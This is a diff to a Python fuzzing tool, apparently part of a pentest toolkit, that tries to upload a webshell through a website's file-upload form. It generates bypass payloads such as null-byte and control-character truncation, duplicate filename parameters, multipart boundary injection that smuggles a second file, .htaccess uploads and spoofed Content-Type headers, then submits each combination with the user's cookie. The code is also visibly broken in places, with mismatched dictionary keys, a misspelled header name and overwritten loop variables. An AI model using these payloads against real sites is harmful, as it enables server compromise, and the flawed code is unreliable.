@@ -5,9 +5,9 @@ import urllib.error
 import urllib.parse
 import sys
 import argparse
-from urllib.parse import urlparse
 from exp10it import get_request
 from exp10it import get_param_part_from_content
+from exp10it import CONTENT_TYPE_LIST
 
 
 def get_form_data_post_info(url, cookie):
@@ -138,9 +138,18 @@ def fuzz_upload_webshell():
     work_file_info = get_work_file_info(url, cookie, form_data_dict, boundary,
                                         form_file_param_name, filename, content_type)
     print(work_file_info)
+    # 正常文件和webshell的后缀分别为work_suffix和script_suffix
     work_suffix = work_file_info['file_suffix']
     work_file_content = work_file_info['file_content']
     work_content_type = work_file_info['content_type']
+    if script_suffix == "php":
+        webshell_content_type = "text/php"
+    elif script_suffix == "asp":
+        webshell_content_type = "application/octet-stream"
+    elif script_suffix == "aspx":
+        webshell_content_type = "application/octet-stream"
+    elif script_suffix == "jsp":
+        webshell_content_type = "application/octet-stream"
 
     rsp = post_multipart_form_data(
         url, cookie, form_data_dict, boundary, form_file_param_name, work_file_content, filename, content_type)
@@ -151,41 +160,76 @@ def fuzz_upload_webshell():
             'modify': {'filename': 'test.%s' % script_suffix}},
         {'desc': '修改后缀为正常后缀接";test.php",eg:"test.jpg;test.php"',
             'modify': {'filename': 'test.%s;test.%s' % (work_suffix, script_suffix)}},
-        {'desc': '双文件上传,前正常文件后webshell', 'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="' % (work_suffix, work_content_type, work_file_content, '--' + boundary , form_file_param_name)}},
-        #{'desc': '双文件上传,前异常后正常', 'modify': {'filename':'test.%s\r\nContent-Type: %s' % suffix}},
-        {'desc': '两个filename参数', 'modify': {'filename': 'test.%s' % suffix}},
-        {'desc': '两个filename参数以空格分割',
-            'modify': {'filename': 'test.%s' % suffix}},
-        {'desc': '两个filename参数以Tab分割',
-            'modify': {'filename': 'test.%s' % suffix}},
-        {'desc': '两个filename参数以\\r\\n分割',
-            'modify': {'filename': 'test.%s' % suffix}},
-        {'desc': '上传.htaccess,只适用于php',
-            'modify': {'filename=test.%s' % suffix}},
+        {'desc': '两个filename参数且前正常文件后webshell', 'modify': {
+            'filename': 'test.%s"; filename="test.%s' % (work_suffix, script_suffix)}},
+        {'desc': '两个filename参数且前webshell后正常文件', 'modify': {
+            'filename': 'test.%s"; filename="test.%s' % (script_suffix, work_suffix)}},
+        # 双文件上传时,只修改file_name值的情况下可控的位置为两个文件的后缀与第一个文件的content-type,共4种情况
+        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改',
+            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
+                work_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
+        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type',
+            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
+                work_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
+        {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type未修改',
+            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
+                script_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
+        {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type修改为正常文件的content-type',
+            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
+                script_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
+
     ]
     for i in range(0, 256):
         item = {'desc': '%00截断组,%s截断' % hex(i), 'modify': {
-                                            'filename': 'test.%s%s.%s' % (script_suffix, chr(i), work_suffix)}}
+            'filename': 'test.%s%s.%s' % (script_suffix, chr(i), work_suffix)}}
         fuzz_file_name.append(item)
+        item = {'desc': '两个filename参数且前正常文件后webshell,且两个filename参数以%s分割' % hex(i), 'modify': {
+            'filename': 'test.%s";%sfilename="test.%s' % (work_suffix, chr(i), script_suffix)}}
+        fuzz_file_name.append(item)
+        item = {'desc': '两个filename参数且前webshell后正常文件,且两个filename参数以%s分割' % hex(i), 'modify': {
+            'filename': 'test.%s";%sfilename="test.%s' % (script_suffix, chr(i), work_suffix)}}
+        fuzz_file_name.append(item)
+    if script_suffix == "php":
+        item = {'desc': '上传.htaccess,只适用于php',
+                'modify': {'filename': '.htaccess'}},
+        fuzz_file_name.append(item)
+
     fuzz_content_type = [
         {'desc': '修改content-type为image/jpeg',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'Content-Type': 'image/jpeg'}},
         {'desc': '修改content-type为image/gif',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'Content-Type': 'image/jpeg'}},
         {'desc': '修改content-type为image/png',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'Content-Type': 'image/jpeg'}},
         {'desc': '修改content-type为text/plain',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
-        {'desc': '修改content-type为xxx/xxx',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'Content-Type': 'image/jpeg'}},
+        # 双文件上传时,只修改content-type值的情况下可控的位置为两个文件的content-type,共4种情况
+        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type未修改',
+            'modify': {'content-type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+                work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
+        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type未修改',
+            'modify': {'content-type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+                webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
+        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type修改为正常文件的content-type',
+            'modify': {'content-type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+                work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
+        {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type修改为正常文件的content-type',
+            'modify': {'content-type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+                webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
     ]
-    for each in fuzz_file_name:
-        filename = each['modify']['filename']
-        content_type = work_file_info['content_type']
-        file_content = work_file_info['file_content']
-        rsp = post_multipart_form_data(
-            url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
-        check_upload_succeed(rsp, origin_html)
+    for each in CONTENT_TYPE_LIST:
+        item = {'desc': '修改content-type为%s' % each,
+                'modify': {'Conten-Type': each}}
+        fuzz_content_type.append(item)
+
+    for filename in fuzz_file_name:
+        for content_type in fuzz_content_type:
+            filename = filename['modify']['filename']
+            content_type = content_type['modify']['content_type']
+            file_content = work_file_info['file_content']
+            rsp = post_multipart_form_data(
+                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+            check_upload_succeed(rsp, origin_html)
 
 
 parser = argparse.ArgumentParser()
